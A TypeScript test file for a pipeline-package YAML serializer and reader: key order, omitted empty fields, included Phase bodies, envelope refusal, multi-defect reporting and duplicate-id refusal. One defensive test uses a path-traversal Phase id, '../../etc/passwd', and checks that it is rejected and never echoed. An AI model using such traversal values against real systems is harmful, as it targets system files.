// Feature 085 T018 — the package document, serialized.
//
// What this file pins is that a `PipelineDefinition` becomes bytes by a rule
// that lives in the module rather than in whichever order a caller happened to
// build the object: key order comes from the constants in `yaml-serializer.ts`,
// an empty list is omitted rather than emitted as a childless key, and an absent
// optional stays absent. Those three together are what makes export
// byte-deterministic (FR-017, research R3), and byte-determinism is what the
// round-trip criterion in US7 later rests on.
//
// The exchange shape is the shipped `PipelineDefinition`, field for field
// (research R4) — no `suggestedName`, no port `id`, no host-resolved runtime
// policy. A references-only document has no `included` key at all (FR-013).
//
// Feature 085 T023 adds the other half: with dependency inclusion, `included`
// carries each distinct referenced Phase's own body, in first-mention order,
// and `spec.phaseIds` is untouched by its presence.
//
// Feature 085 T028 adds the read direction (test-first). Two levels, and the
// difference is what FR-023 and FR-029 turn on:
//
//   document — the envelope is not one this build reads: no `apiVersion`, no
//              `kind`, or values it does not support. No resource is classified
//              and no partial row is produced.
//   resource — the envelope is ours and a resource inside it is malformed. It
//              is classified `invalid`, naming EVERY defect found in one pass
//              rather than the first (FR-027), and the other resources the
//              document declares are still classified.
//
// The root Pipeline's field rules are the shipped catalog validator's, reached
// rather than restated, so the exchange format cannot come to accept a value the
// catalog would reject. Defect field names are therefore the catalog's own, with
// the single documented rename mapped back: the document's key is `id`, so a
// defect on it says `id` and not `pipelineId` (data-model.md §2.2).

import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';

import {
  PIPELINE_INPUT_PORT_TYPES,
  PIPELINE_OUTPUT_PORT_TYPES
} from '../../../src/contracts/pipeline-definitions';
import type {
  PipelineDefinition,
  PipelineInputPort,
  PipelineOutputPort
} from '../../../src/contracts/pipeline-definitions';
import type { PhaseDefinition } from '../../../src/contracts/process-definitions';
import {
  documentFromPhaseDefinition,
  phaseDefinitionFromDocument
} from '../../../src/services/process-yaml/phase-yaml-mapper';
import { validatePhaseDocument } from '../../../src/services/process-yaml/phase-yaml-validator';
import {
  documentFromPipelineDefinition,
  parsePipelinePackage,
  referencedPhaseOrder,
  serializePipelineDocument,
  type PipelinePackageResource,
  type PipelinePackageResult
} from '../../../src/services/process-yaml/pipeline-document';
import { parseDocumentText } from '../../../src/services/process-yaml/yaml-parser';
import {
  PHASE_YAML_API_VERSION,
  PIPELINE_YAML_KIND,
  type ImportDefect
} from '../../../src/services/process-yaml/types';
import {
  BINDING_SOURCE_KEY_ORDER,
  DOCUMENT_KEY_ORDER,
  EXECUTION_DEFAULTS_KEY_ORDER,
  INPUT_BINDING_KEY_ORDER,
  INPUT_PORT_KEY_ORDER,
  METADATA_KEY_ORDER,
  OUTPUT_BINDING_KEY_ORDER,
  OUTPUT_PORT_KEY_ORDER,
  PACKAGE_DOCUMENT_KEY_ORDER,
  PIPELINE_METADATA_KEY_ORDER,
  PIPELINE_SPEC_KEY_ORDER,
  SPEC_KEY_ORDER,
  serializePhaseDocument
} from '../../../src/services/process-yaml/yaml-serializer';

/** Serialize a definition the way export does: map, then emit. */
function emit(definition: PipelineDefinition): string {
  return serializePipelineDocument(documentFromPipelineDefinition(definition));
}

/** The same, with the operator's dependency-inclusion choice made concrete. */
function emitWith(
  definition: PipelineDefinition,
  phases: readonly PhaseDefinition[]
): string {
  return serializePipelineDocument(documentFromPipelineDefinition(definition, phases));
}

/** The smallest legal Pipeline: identity plus one Phase, nothing optional. */
const MINIMAL: PipelineDefinition = {
  pipelineId: 'ship-it',
  name: 'Ship It',
  version: 1,
  phaseIds: ['specify'],
  inputs: [],
  outputs: [],
  bindings: [],
  recommendedNext: []
};

/**
 * Every field the format carries, with both binding variants and both binding
 * source forms. `phaseIds` repeats `specify` deliberately: that repeat is the
 * reason bindings address a Phase by `phaseIndex` and never by `phaseId`
 * (project hard rule), and it is what makes the list's order load-bearing.
 */
const FULL: PipelineDefinition = {
  pipelineId: 'ship-it',
  name: 'Ship It',
  description: 'Specify, plan, then specify again.',
  version: 3,
  phaseIds: ['specify', 'plan', 'specify'],
  inputs: [
    {
      portId: 'feature-brief',
      label: 'Feature brief',
      type: 'text',
      required: true,
      description: 'What to build.'
    },
    { portId: 'repo', label: 'Repository', type: 'repository-context' }
  ],
  outputs: [
    {
      portId: 'plan-document',
      label: 'Plan',
      type: 'markdown',
      description: 'The written plan.'
    },
    { portId: 'artifacts', label: 'Artifacts', type: 'file-set' }
  ],
  bindings: [
    {
      kind: 'input',
      phaseIndex: 0,
      inputKey: 'brief',
      source: { from: 'pipeline-input', portId: 'feature-brief' }
    },
    {
      kind: 'input',
      phaseIndex: 1,
      inputKey: 'spec',
      source: { from: 'phase-output', phaseIndex: 0, portId: 'spec-document' }
    },
    { kind: 'output', phaseIndex: 1, portId: 'plan-document', outputKey: 'plan' }
  ],
  executionDefaults: {
    runner: 'claude',
    model: 'opus',
    effort: 'high',
    timeoutSeconds: 900
  },
  recommendedNext: ['ship-it-again', 'review-it']
};

/**
 * The two distinct Phases `FULL.phaseIds` names. One instruction-shaped, one
 * skill-shaped with an optional field set, so the included bodies exercise both
 * `spec` variants rather than one twice.
 */
const SPECIFY_PHASE: PhaseDefinition = {
  phaseId: 'specify',
  name: 'Specify',
  version: 2,
  instruction: 'Write the spec.'
};

const PLAN_PHASE: PhaseDefinition = {
  phaseId: 'plan',
  name: 'Plan',
  description: 'Plan it.',
  version: 5,
  skill: 'speckit-plan',
  effort: 'high'
};

describe('Feature 085 — the package document declares what it is', () => {
  it('carries the one apiVersion and the Pipeline kind', () => {
    const document = documentFromPipelineDefinition(MINIMAL);
    expect(document.apiVersion).toBe(PHASE_YAML_API_VERSION);
    expect(document.kind).toBe('Pipeline');
    expect(PIPELINE_YAML_KIND).toBe('Pipeline');
  });

  it('renames only the identity field, and carries every other value verbatim', () => {
    // `pipelineId` becomes `metadata.id` because the document names the resource
    // once, under a key that does not repeat the kind (data-model.md §2.2).
    const document = documentFromPipelineDefinition(FULL);
    expect(document.metadata).toEqual({
      id: 'ship-it',
      name: 'Ship It',
      version: 3,
      description: 'Specify, plan, then specify again.'
    });
    expect(document.spec.phaseIds).toEqual(['specify', 'plan', 'specify']);
    expect(document.spec.bindings).toEqual(FULL.bindings);
    expect(document.spec.executionDefaults).toEqual(FULL.executionDefaults);
  });
});

describe('Feature 085 — serialization is byte-determined by the module', () => {
  it('emits the full document in the declared key order', () => {
    expect(emit(FULL)).toBe(
      [
        'apiVersion: schegent/v1',
        'kind: Pipeline',
        'metadata:',
        '  id: ship-it',
        '  name: Ship It',
        '  version: 3',
        '  description: Specify, plan, then specify again.',
        'spec:',
        '  phaseIds:',
        '    - specify',
        '    - plan',
        '    - specify',
        '  inputs:',
        '    - portId: feature-brief',
        '      label: Feature brief',
        '      type: text',
        '      required: true',
        '      description: What to build.',
        '    - portId: repo',
        '      label: Repository',
        '      type: repository-context',
        '  outputs:',
        '    - portId: plan-document',
        '      label: Plan',
        '      type: markdown',
        '      description: The written plan.',
        '    - portId: artifacts',
        '      label: Artifacts',
        '      type: file-set',
        '  bindings:',
        '    - kind: input',
        '      phaseIndex: 0',
        '      inputKey: brief',
        '      source:',
        '        from: pipeline-input',
        '        portId: feature-brief',
        '    - kind: input',
        '      phaseIndex: 1',
        '      inputKey: spec',
        '      source:',
        '        from: phase-output',
        '        phaseIndex: 0',
        '        portId: spec-document',
        '    - kind: output',
        '      phaseIndex: 1',
        '      portId: plan-document',
        '      outputKey: plan',
        '  executionDefaults:',
        '    runner: claude',
        '    model: opus',
        '    effort: high',
        '    timeoutSeconds: 900',
        '  recommendedNext:',
        '    - ship-it-again',
        '    - review-it',
        ''
      ].join('\n')
    );
  });

  it('emits the minimal document with every empty list omitted', () => {
    // Not `inputs:` with nothing under it — a childless key reads back as an
    // empty MAPPING, which would make the round trip lossy in exactly the case
    // where nothing is happening (research R3). Omission round-trips: the reader
    // treats an absent list-typed key as `[]` (data-model.md §2.5).
    expect(emit(MINIMAL)).toBe(
      [
        'apiVersion: schegent/v1',
        'kind: Pipeline',
        'metadata:',
        '  id: ship-it',
        '  name: Ship It',
        '  version: 1',
        'spec:',
        '  phaseIds:',
        '    - specify',
        ''
      ].join('\n')
    );
  });

  it('omits an absent description and absent executionDefaults rather than defaulting them', () => {
    const text = emit(MINIMAL);
    expect(text).not.toContain('description');
    expect(text).not.toContain('executionDefaults');
  });

  it('omits an executionDefaults whose every field is absent', () => {
    // The mapping is present on the definition but carries nothing to write. A
    // bare `executionDefaults:` would read back as an empty mapping rather than
    // as the absence it represents, so the same omission rule applies.
    expect(emit({ ...MINIMAL, executionDefaults: {} })).toBe(emit(MINIMAL));
  });

  it('writes only the executionDefaults fields that are present', () => {
    expect(emit({ ...MINIMAL, executionDefaults: { effort: 'max' } })).toContain(
      ['  executionDefaults:', '    effort: max', ''].join('\n')
    );
  });

  it('key order comes from the module, not from the object it was handed', () => {
    // Same values, built in the opposite order. Nothing reads `Object.keys`.
    const reversed = {
      recommendedNext: FULL.recommendedNext,
      executionDefaults: FULL.executionDefaults,
      bindings: FULL.bindings,
      outputs: FULL.outputs,
      inputs: FULL.inputs,
      phaseIds: FULL.phaseIds,
      version: FULL.version,
      description: FULL.description,
      name: FULL.name,
      pipelineId: FULL.pipelineId
    } as PipelineDefinition;
    expect(emit(reversed)).toBe(emit(FULL));
  });

  it('is deterministic — the same definition emits the same bytes', () => {
    expect(emit(FULL)).toBe(emit(FULL));
  });

  it('never emits an included section for a references-only document (FR-013)', () => {
    // Not an empty one, not a null one: the key is absent from the document and
    // from the bytes. A references-only export is defined by that absence.
    const document = documentFromPipelineDefinition(FULL);
    expect(Object.keys(document)).toEqual(['apiVersion', 'kind', 'metadata', 'spec']);
    expect('included' in document).toBe(false);
    expect(emit(FULL)).not.toContain('included');
  });
});

describe('Feature 085 — the included section carries whole Phases (US2)', () => {
  it('gives each included Phase the same metadata and spec the single-Phase document defines', () => {
    // FR-008 — not a similar shape, the SAME one. Built by the same mapper and
    // compared against it, so a field the single-Phase document learns to carry
    // is carried here too without this test being edited.
    const document = documentFromPipelineDefinition(FULL, [SPECIFY_PHASE, PLAN_PHASE]);
    const bodies = document.included?.phases ?? [];
    expect(bodies).toHaveLength(2);
    for (const [index, phase] of [SPECIFY_PHASE, PLAN_PHASE].entries()) {
      const standalone = documentFromPhaseDefinition(phase);
      expect(bodies[index]).toEqual({
        metadata: standalone.metadata,
        spec: standalone.spec
      });
    }
  });

  it('does not repeat apiVersion or kind inside an included Phase', () => {
    // FR-003 — the package already declared what it is. A second declaration
    // under `included` would be a second root in one document.
    const document = documentFromPipelineDefinition(FULL, [SPECIFY_PHASE, PLAN_PHASE]);
    for (const body of document.included?.phases ?? []) {
      expect(Object.keys(body)).toEqual(['metadata', 'spec']);
    }
    const text = emitWith(FULL, [SPECIFY_PHASE, PLAN_PHASE]);
    // `apiVersion` appears nowhere else in the format, so one occurrence
    // anywhere is the whole check — an indented repeat would be a second.
    // `kind:` is also a binding field, so the root declaration is pinned by
    // column and a re-declared Phase kind by value.
    expect(text.match(/apiVersion:/g)).toHaveLength(1);
    expect(text.match(/^kind:/gm)).toHaveLength(1);
    expect(text).not.toContain('kind: Phase');
  });

  it('writes each distinct referenced Phase once, in first-mention order', () => {
    // FR-016 — `FULL.phaseIds` is ['specify', 'plan', 'specify']. Three
    // positions, two definitions, and the repeat collapses onto its first
    // mention rather than appearing again at the end.
    expect(referencedPhaseOrder(FULL.phaseIds)).toEqual(['specify', 'plan']);
    const document = documentFromPipelineDefinition(FULL, [SPECIFY_PHASE, PLAN_PHASE]);
    expect(document.included?.phases.map((body) => body.metadata.phaseId)).toEqual([
      'specify',
      'plan'
    ]);
  });

  it('derives that order from phaseIds, not from the order the Phases arrived in', () => {
    // The caller's array is a lookup. Handing it back reversed must not reorder
    // the document, or two installations that resolved their catalog differently
    // would export different bytes for the same Pipeline (FR-016, FR-017).
    expect(emitWith(FULL, [PLAN_PHASE, SPECIFY_PHASE])).toBe(
      emitWith(FULL, [SPECIFY_PHASE, PLAN_PHASE])
    );
  });

  it('leaves phaseIds authoritative and unchanged when definitions are included', () => {
    // FR-019 — inclusion adds definitions; it never changes what the Pipeline
    // runs or in what order. The de-duplicated `included` order is emphatically
    // NOT the run order: the repeat stays in `phaseIds`.
    const withInclusion = documentFromPipelineDefinition(FULL, [SPECIFY_PHASE, PLAN_PHASE]);
    expect(withInclusion.spec.phaseIds).toEqual(['specify', 'plan', 'specify']);
    expect(withInclusion.spec).toEqual(documentFromPipelineDefinition(FULL).spec);
  });

  it('emits the included section after spec, in the declared shape', () => {
    expect(emitWith(FULL, [SPECIFY_PHASE, PLAN_PHASE])).toContain(
      [
        '  recommendedNext:',
        '    - ship-it-again',
        '    - review-it',
        'included:',
        '  phases:',
        '    - metadata:',
        '        phaseId: specify',
        '        name: Specify',
        '        version: 2',
        '      spec:',
        '        instruction: Write the spec.',
        '    - metadata:',
        '        phaseId: plan',
        '        name: Plan',
        '        version: 5',
        '        description: Plan it.',
        '      spec:',
        '        skill: speckit-plan',
        '        effort: high',
        ''
      ].join('\n')
    );
  });

  it('omits the key entirely when the inclusion resolves to no Phases', () => {
    // The same rule as an empty list and an empty `executionDefaults`: a
    // childless `included:` reads back as an empty mapping, not as the absence
    // it represents (research R3).
    const document = documentFromPipelineDefinition(MINIMAL, []);
    expect('included' in document).toBe(false);
    expect(emitWith(MINIMAL, [])).toBe(emit(MINIMAL));
  });

  it('is deterministic — the same inclusion emits the same bytes', () => {
    expect(emitWith(FULL, [SPECIFY_PHASE, PLAN_PHASE])).toBe(
      emitWith(FULL, [SPECIFY_PHASE, PLAN_PHASE])
    );
  });
});

describe('Feature 085 — every declared port type survives emission', () => {
  it('writes each input port type as authored', () => {
    const inputs: readonly PipelineInputPort[] = PIPELINE_INPUT_PORT_TYPES.map((type, index) => ({
      portId: `in-${index}`,
      label: `In ${index}`,
      type
    }));
    const text = emit({ ...MINIMAL, inputs });
    for (const type of PIPELINE_INPUT_PORT_TYPES) {
      expect(text).toContain(`      type: ${type}\n`);
    }
  });

  it('writes each output port type as authored', () => {
    const outputs: readonly PipelineOutputPort[] = PIPELINE_OUTPUT_PORT_TYPES.map(
      (type, index) => ({ portId: `out-${index}`, label: `Out ${index}`, type })
    );
    const text = emit({ ...MINIMAL, outputs });
    for (const type of PIPELINE_OUTPUT_PORT_TYPES) {
      expect(text).toContain(`      type: ${type}\n`);
    }
  });

  it('omits an absent optional port field without shifting the ones that remain', () => {
    const text = emit({
      ...MINIMAL,
      inputs: [{ portId: 'brief', label: 'Brief', type: 'text' }],
      outputs: [{ portId: 'spec', label: 'Spec', type: 'markdown' }]
    });
    expect(text).toContain(
      ['  inputs:', '    - portId: brief', '      label: Brief', '      type: text', ''].join('\n')
    );
    expect(text).not.toContain('required:');
  });
});

describe('Feature 085 — values the emitter must not hand back as another type', () => {
  it('quotes a name that another reader would resolve to a boolean', () => {
    // Our own parser never types a scalar, but a document we write is read by
    // tools that do. `chooseScalarStyle` is the single decision site, and this
    // asserts the package path goes through it rather than around it.
    expect(emit({ ...MINIMAL, name: 'off' })).toContain('  name: "off"\n');
  });

  it('quotes a phase id that looks like a number', () => {
    expect(emit({ ...MINIMAL, phaseIds: ['2026'] })).toContain('    - "2026"\n');
  });

  it('writes a multi-line description as a block literal indented from its key', () => {
    expect(emit({ ...MINIMAL, description: 'First line.\nSecond line.' })).toContain(
      ['  description: |-', '    First line.', '    Second line.', ''].join('\n')
    );
  });
});

// ---------------------------------------------------------------------------
// Reading a package back — feature 085 T028 (US3)
// ---------------------------------------------------------------------------

/** Read a package the way preflight does: parse the tree, then classify it. */
function read(text: string): PipelinePackageResult {
  const parsed = parseDocumentText(text);
  if (!parsed.ok) {
    throw new Error(`fixture did not parse: ${parsed.refusal.code} ${parsed.refusal.message}`);
  }
  return parsePipelinePackage(parsed.node);
}

/** The classified resources of a package whose envelope was accepted. */
function resources(text: string): readonly PipelinePackageResource[] {
  const result = read(text);
  if (!result.ok) {
    throw new Error(`expected the envelope to be accepted, got ${result.refusal.code}`);
  }
  return result.resources;
}

/** The defects of the resource at `index`, which the caller expects to be invalid. */
function defectsOf(text: string, index = 0): readonly ImportDefect[] {
  const resource = resources(text)[index];
  if (resource === undefined) throw new Error(`no resource at index ${index}`);
  if (resource.ok) throw new Error(`expected resource ${index} to be invalid`);
  return resource.defects;
}

/** `field/code` pairs — what a defect assertion is actually about. */
function codesOf(found: readonly ImportDefect[]): readonly string[] {
  return found.map((defect) => `${defect.field}/${defect.code}`);
}

const WELL_FORMED_METADATA = ['id: ship-it', 'name: Ship It', 'version: 1'] as const;
const WELL_FORMED_SPEC = ['phaseIds:', '  - specify'] as const;

/**
 * One `included.phases` entry at the indent the emitter writes it, so a fixture
 * and an exported document are the same shape rather than two conventions.
 */
function includedPhase(
  metadata: readonly string[],
  spec: readonly string[]
): readonly string[] {
  return [
    '    - metadata:',
    ...metadata.map((line) => `        ${line}`),
    '      spec:',
    ...spec.map((line) => `        ${line}`)
  ];
}

/** A package document, defaulting to a well-formed one so a fixture states only its defect. */
function pkg(body: {
  readonly apiVersion?: string | null;
  readonly kind?: string | null;
  readonly metadata?: readonly string[];
  readonly spec?: readonly string[];
  readonly phases?: readonly (readonly string[])[];
}): string {
  const lines: string[] = [];
  if (body.apiVersion !== null) lines.push(`apiVersion: ${body.apiVersion ?? 'schegent/v1'}`);
  if (body.kind !== null) lines.push(`kind: ${body.kind ?? 'Pipeline'}`);
  lines.push('metadata:');
  for (const line of body.metadata ?? WELL_FORMED_METADATA) lines.push(`  ${line}`);
  lines.push('spec:');
  for (const line of body.spec ?? WELL_FORMED_SPEC) lines.push(`  ${line}`);
  if (body.phases !== undefined) {
    lines.push('included:', '  phases:', ...body.phases.flat());
  }
  return `${lines.join('\n')}\n`;
}

describe('Feature 085 — the envelope decides whether anything is classified (US3)', () => {
  it('classifies one resource per declaration when the package is well formed', () => {
    // The baseline the defect tests are read against. Without it, every
    // assertion below could pass on a reader that refused everything.
    const found = resources(
      pkg({
        phases: [includedPhase(['phaseId: specify', 'name: Specify', 'version: 2'], ['instruction: Write the spec.'])]
      })
    );
    expect(found.map((resource) => resource.resourceKind)).toEqual(['pipeline', 'phase']);
    expect(found.every((resource) => resource.ok)).toBe(true);
  });

  it('produces no resources at all when the document itself is refused (FR-029)', () => {
    // A document-level refusal is not a resource with defects. Nothing is
    // classified, so there is nothing a plan could be built from.
    for (const text of [
      pkg({ apiVersion: null }),
      pkg({ apiVersion: 'schegent/v2' }),
      pkg({ kind: null }),
      pkg({ kind: 'Phase' })
    ]) {
      const result = read(text);
      expect(result.ok).toBe(false);
      if (!result.ok) expect('resources' in result).toBe(false);
    }
  });

  it('checks the version before the kind, so an unknown format is not misreported', () => {
    const result = read(pkg({ apiVersion: 'other/v9', kind: 'Workflow' }));
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.refusal.code).toBe('unsupported-version');
  });
});

describe('Feature 085 — an invalid resource names every defect, not the first (FR-027)', () => {
  it('reports metadata and spec defects together in one pass', () => {
    // Six problems, one read. An operator fixing this document sees the whole
    // list rather than peeling it one error per attempt — which is the entire
    // point of FR-027, and is why a section that fails must not short-circuit
    // the sections after it.
    const found = codesOf(
      defectsOf(
        pkg({
          metadata: ['id: Not Valid', 'version: 0', 'author: someone'],
          spec: [
            'phaseIds:',
            '  - specify',
            'executionDefaults:',
            '  effort: extreme',
            '  timeoutSeconds: 0'
          ]
        })
      )
    );
    expect(found).toEqual(
      expect.arrayContaining([
        'id/invalid-pattern',
        'name/invalid-length',
        'version/positive-integer-required',
        'author/unknown-field',
        'executionDefaults.effort/invalid-enum',
        'executionDefaults.timeoutSeconds/invalid-range'
      ])
    );
  });

  it('reports every defective port and binding, not the first of each list', () => {
    const found = codesOf(
      defectsOf(
        pkg({
          spec: [
            'phaseIds:',
            '  - specify',
            'inputs:',
            '  - portId: brief',
            '    label: Brief',
            '    type: telepathy',
            '  - portId: Not Valid',
            '    label: ""',
            '    type: text',
            'outputs:',
            '  - portId: plan',
            '    label: Plan',
            '    type: hologram'
          ]
        })
      )
    );
    expect(found).toEqual(
      expect.arrayContaining([
        'inputs[0].type/invalid-enum',
        'inputs[1].portId/invalid-pattern',
        'inputs[1].label/invalid-length',
        'outputs[0].type/invalid-enum'
      ])
    );
  });

  it('names a Phase reference that is not an identifier rather than resolving it (FR-009)', () => {
    // A reference is a plain identifier. A path-shaped one is refused as a
    // malformed id — it is never opened, joined, or resolved as a location.
    const found = defectsOf(
      pkg({ spec: ['phaseIds:', '  - ../../etc/passwd', '  - specify'] })
    );
    expect(codesOf(found)).toContain('phaseIds[0]/invalid-pattern');
    for (const defect of found) {
      expect(defect.message).not.toContain('/etc/passwd');
    }
  });

  it('carries the declared id when it is well formed, and null when it is not (FR-026)', () => {
    // The operator has to be able to tell which resource the defects belong to.
    // A bad version must not also hide which Pipeline is at fault.
    const withId = resources(pkg({ metadata: ['id: ship-it', 'name: Ship It', 'version: 0'] }))[0];
    expect(withId?.ok).toBe(false);
    if (withId !== undefined && !withId.ok) expect(withId.resourceId).toBe('ship-it');

    const withoutId = resources(pkg({ metadata: ['name: Ship It', 'version: 1'] }))[0];
    expect(withoutId?.ok).toBe(false);
    if (withoutId !== undefined && !withoutId.ok) expect(withoutId.resourceId).toBeNull();
  });

  it('bounds every defect field so a package cannot inject a wall of text', () => {
    const found = defectsOf(
      pkg({ metadata: [...WELL_FORMED_METADATA, `${'k'.repeat(200)}: v`] })
    );
    expect(found.length).toBeGreaterThan(0);
    for (const defect of found) {
      expect(defect.field.length).toBeLessThanOrEqual(32);
      expect(defect.code.length).toBeLessThanOrEqual(64);
      expect(defect.message.length).toBeLessThanOrEqual(512);
    }
  });
});

describe('Feature 085 — one defective resource does not silence the others (FR-023, FR-024)', () => {
  it('classifies every declared resource even when the root Pipeline is invalid', () => {
    const found = resources(
      pkg({
        metadata: ['id: Not Valid', 'name: Ship It', 'version: 1'],
        phases: [
          includedPhase(['phaseId: specify', 'name: Specify', 'version: 2'], ['instruction: Write the spec.']),
          includedPhase(['phaseId: plan', 'version: 0'], ['effort: extreme'])
        ]
      })
    );
    expect(found.map((resource) => resource.resourceKind)).toEqual(['pipeline', 'phase', 'phase']);
    expect(found.map((resource) => resource.ok)).toEqual([false, true, false]);
  });

  it('gives an included Phase exactly the defects the single-Phase reader would (FR-008)', () => {
    // Not a similar list, the SAME one — produced by the shipped Phase rules
    // rather than by a second copy of them. A rule the standalone reader gains
    // is gained here too, without this test being edited.
    const metadata = ['phaseId: Not Valid', 'version: 0', 'author: someone'];
    const spec = ['instruction: Do it', 'skill: speckit-plan', 'effort: extreme'];

    const packaged = resources(pkg({ phases: [includedPhase(metadata, spec)] }))[1];
    expect(packaged?.ok).toBe(false);

    const standaloneText = [
      'apiVersion: schegent/v1',
      'kind: Phase',
      'metadata:',
      ...metadata.map((line) => `  ${line}`),
      'spec:',
      ...spec.map((line) => `  ${line}`),
      ''
    ].join('\n');
    const parsed = parseDocumentText(standaloneText);
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    const standalone = validatePhaseDocument(parsed.node);
    expect(standalone.ok).toBe(false);

    if (packaged !== undefined && !packaged.ok && !standalone.ok && standalone.kind === 'resource') {
      expect(packaged.defects).toEqual(standalone.defects);
      expect(packaged.resourceId).toBe(standalone.resourceId);
    }
  });

  it('gives a valid included Phase the document a standalone one would have had', () => {
    // The package declared `apiVersion` and `kind` once, for every resource in
    // it (FR-003). Reading them back onto each Phase is what makes a packaged
    // Phase and a standalone one the same resource at a different indent.
    const packaged = resources(
      pkg({
        phases: [includedPhase(['phaseId: specify', 'name: Specify', 'version: 2'], ['instruction: Write the spec.'])]
      })
    )[1];
    expect(packaged?.ok).toBe(true);
    if (packaged !== undefined && packaged.ok && packaged.resourceKind === 'phase') {
      expect(packaged.document).toEqual(documentFromPhaseDefinition(SPECIFY_PHASE));
    }
  });
});

// ---------------------------------------------------------------------------
// Feature 085 T051 — two resources cannot claim the same id (US6, FR-031)
// ---------------------------------------------------------------------------
//
// This is a document-level refusal rather than a per-resource defect, and the
// distinction is the point. Per-resource, one of the two would have to be the
// "winner" and the other the defect — a choice the document does not authorize
// anyone to make. Refusing the whole document says the truth: which of the two
// the author meant is unknowable from the file.
//
// It also protects the plan's shape. A plan is one row per declared resource
// (FR-024) keyed by id for the operator to read, and the presence oracle is
// consulted per resource against the STORED catalog — not against the other
// resources of the same document. Two rows for one id would let the first plan
// `import` and the second plan `import` too, and the confirmed write would land
// one of them with nothing recording which.

describe('Feature 085 T051 — a duplicate id refuses the document (FR-031)', () => {
  const SPECIFY = includedPhase(
    ['phaseId: specify', 'name: Specify', 'version: 2'],
    ['instruction: Write the spec.']
  );

  it('refuses a package declaring the same Phase id twice', () => {
    const result = read(
      pkg({
        spec: ['phaseIds:', '  - specify'],
        phases: [
          SPECIFY,
          includedPhase(
            ['phaseId: specify', 'name: Specify Again', 'version: 9'],
            ['instruction: A different instruction entirely.']
          )
        ]
      })
    );

    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.refusal.code).toBe('duplicate-id');
    // The id is named — it is the operator's only handle on which pair to
    // reconcile — and it is echoed through the same bounded path every other
    // document-derived string takes.
    expect(result.refusal.message).toContain('specify');
  });

  it('refuses before classifying anything, so no partial plan exists (FR-029)', () => {
    const result = read(
      pkg({
        spec: ['phaseIds:', '  - specify'],
        phases: [SPECIFY, SPECIFY]
      })
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect('resources' in result).toBe(false);
  });

  it('refuses on the id alone, whatever else differs between the two', () => {
    // Identical-but-for-the-body is the honest case, and so is
    // identical-in-every-way: neither is a document a reader can resolve.
    for (const second of [
      includedPhase(['phaseId: specify', 'name: Other', 'version: 1'], ['skill: speckit-specify']),
      includedPhase(['phaseId: specify', 'name: Specify', 'version: 2'], ['instruction: Write the spec.'])
    ]) {
      const result = read(pkg({ spec: ['phaseIds:', '  - specify'], phases: [SPECIFY, second] }));
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.refusal.code).toBe('duplicate-id');
    }
  });

  it('accepts distinct ids, so the check is not "more than one Phase"', () => {
    const found = resources(
      pkg({
        spec: ['phaseIds:', '  - specify', '  - plan'],
        phases: [
          SPECIFY,
          includedPhase(['phaseId: plan', 'name: Plan', 'version: 1'], ['skill: speckit-plan'])
        ]
      })
    );
    expect(found.map((resource) => resource.resourceKind)).toEqual(['pipeline', 'phase', 'phase']);
  });

  it('does not compare an id across kinds', () => {
    // The root is a Pipeline and the included resources are Phases; they live in
    // separate catalogs, so a Phase named `ship-it` is not a second claim on the
    // root's id.
    const found = resources(
      pkg({
        metadata: ['id: ship-it', 'name: Ship It', 'version: 1'],
        spec: ['phaseIds:', '  - ship-it'],
        phases: [
          includedPhase(['phaseId: ship-it', 'name: Ship It Phase', 'version: 1'], ['instruction: Ship.'])
        ]
      })
    );
    expect(found).toHaveLength(2);
    expect(found.every((resource) => resource.ok)).toBe(true);
  });

  it('refuses a duplicate whose partner is malformed, rather than reporting a defect', () => {
    // A malformed resource claims no id for dependency resolution (FR-032), but
    // it still DECLARED one, and the document is still ambiguous about which of
    // the two the author meant. Treating a malformed partner as absent would let
    // the well-formed one silently win — the exact outcome FR-031 excludes.
    const result = read(
      pkg({
        spec: ['phaseIds:', '  - specify'],
        phases: [SPECIFY, includedPhase(['phaseId: specify', 'name: Specify', 'version: 0'], [])]
      })
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.refusal.code).toBe('duplicate-id');
  });

  it('does not refuse a resource whose id is unreadable', () => {
    // Two resources with no readable id are not two claims on one id — there is
    // no id. They report their own defects, which is what the operator fixes.
    const found = resources(
      pkg({
        spec: ['phaseIds:', '  - specify'],
        phases: [
          includedPhase(['name: No Id', 'version: 1'], ['instruction: One.']),
          includedPhase(['name: Also No Id', 'version: 1'], ['instruction: Two.'])
        ]
      })
    );
    expect(found).toHaveLength(3);
    expect(found.slice(1).every((resource) => !resource.ok)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Feature 085 T062 — what the format will not carry (FR-007, FR-051, FR-052)
// ---------------------------------------------------------------------------
//
// Three distinct claims, and the reason they are separate tests rather than one
// is that they fail for different reasons and would be fixed in different
// places:
//
//   FR-007  the document's key surface is exactly what a catalog operator is
//           authorized to author. Host-owned runtime policy is not in it — not
//           because it is sensitive, but because a document that carried it
//           would be asserting authority the operator does not have.
//   FR-051  nothing about a RUN travels. Run state, session values, queue
//           contents, history, audit records, secrets, generated results: all of
//           it belongs to an installation, and a document is portable precisely
//           because it does not describe one.
//   FR-052  no executable extension code is transported. `skill` is a NAME the
//           receiving installation resolves at run time (FR-007, QS-25); it is
//           not, and must not become, a body.
//
// The key-order constants are the enforcement surface for all three, so they are
// what these tests read. A field added to a definition without being added to an
// order is silently dropped on write; a field added to an order is a field this
// format now carries, and one of these tests should have to change to allow it.

/** Every authored key this format admits, from the serializer's own constants. */
const AUTHORIZED_KEYS: ReadonlySet<string> = new Set<string>([
  ...DOCUMENT_KEY_ORDER,
  ...METADATA_KEY_ORDER,
  ...SPEC_KEY_ORDER,
  ...PACKAGE_DOCUMENT_KEY_ORDER,
  ...PIPELINE_METADATA_KEY_ORDER,
  ...PIPELINE_SPEC_KEY_ORDER,
  ...INPUT_PORT_KEY_ORDER,
  ...OUTPUT_PORT_KEY_ORDER,
  ...INPUT_BINDING_KEY_ORDER,
  ...OUTPUT_BINDING_KEY_ORDER,
  ...BINDING_SOURCE_KEY_ORDER,
  ...EXECUTION_DEFAULTS_KEY_ORDER,
  'phases'
]);

/** Every key appearing in a document's text, at any depth. */
function documentKeys(text: string): readonly string[] {
  return [...text.matchAll(/^\s*(?:- )?([A-Za-z][\w-]*):/gm)].map((match) => match[1]!);
}

